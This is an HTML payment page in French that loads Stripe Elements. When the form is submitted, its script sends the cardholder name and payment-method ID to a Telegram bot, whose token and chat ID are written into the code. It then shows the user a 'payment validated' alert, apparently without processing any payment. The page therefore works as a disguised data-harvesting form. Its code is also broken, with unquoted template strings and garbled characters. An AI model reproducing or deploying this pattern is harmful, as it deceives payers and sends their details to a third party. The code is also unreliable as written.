<html lang="fr">
<head>
    <meta charset="UTF-8">

    <title>Formulaire de Paiement</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f9f9f9;
        }
        h2 {
            color: #7f1d1d;
            text-align: center;
        }
        form {
            max-width: 400px;
            margin: 0 auto;
            background: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        label {
            font-size: 14px;
            font-weight: bold;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #7f1d1d;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #a82626;
        }
        #card-errors {
            color: red;
            font-size: 14px;
            margin-top: -10px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <h2>Informations de Paiement</h2>
    <form id="payment-form">
        <label for="cardholder-name">Nom du Titulaire</label>
        <input type="text" id="cardholder-name" placeholder="Entrez le nom du titulaire" required />

        <div id="card-element">
            <!-- Stripe.js int√®gre ici les champs de carte -->
        </div>
        <div id="card-errors" role="alert"></div>

        <button type="submit">Payer maintenant</button>
    </form>

    <script>
        // Configuration Stripe
        const stripe = Stripe("pk_test_51HxM4lEY1234567890abcdEFGH");
        const elements = stripe.elements();

        const style = {
            base: {
                color: "#32325d",
                fontFamily: 'Roboto, Arial, sans-serif',
                fontSize: "16px",
                "::placeholder": {
                    color: "#aab7c4"
                }
            },
            invalid: {
                color: "#fa755a",
                iconColor: "#fa755a"
            }
        };

        const card = elements.create("card", { style });
        card.mount("#card-element");

        card.on("change", (event) => {
            const displayError = document.getElementById("card-errors");
            if (event.error) {
                displayError.textContent = event.error.message;
            } else {
                displayError.textContent = "";
            }
        });

        // Variables Telegram
        const botToken = '8101158488:AAH6WIfCC6bGkWd_Tt6QRrWD8QKQQc69M';
        const chatId = '5372119436';

        // Gestion du formulaire
        const form = document.getElementById("payment-form");
        form.addEventListener("submit", async (event) => {
            event.preventDefault();

            const cardholderName = document.getElementById("cardholder-name").value;

            if (!cardholderName) {
                alert("Veuillez entrer le nom du titulaire.");
                return;
            }

            const { paymentMethod, error } = await stripe.createPaymentMethod({
                type: "card",
                card: card,
                billing_details: {
                    name: cardholderName,
                },
            });

            if (error) {
                const errorElement = document.getElementById("card-errors");
                errorElement.textContent = error.message;
            } else {
                // Envoyer les donn√©es √† Telegram
                const message = üßæ **Nouvelle Transaction**\n\nüîπ Nom: ${cardholderName}\nüîπ PaymentMethod ID: ${paymentMethod.id};
                fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown",
                    }),
                })
                .then(response => response.json())
                .then(dataResponse => {
                    if (dataResponse.ok) {
                        alert("‚úÖ Paiement valid√© !");
                        window.location.href = "Traitement.html";
                    } else {
                        alert("Erreur lors de l'envoi √† Telegram.");
                    }
                })
                .catch(err => console.error("Erreur Telegram:", err));
            }
        });
    </script>
</body>
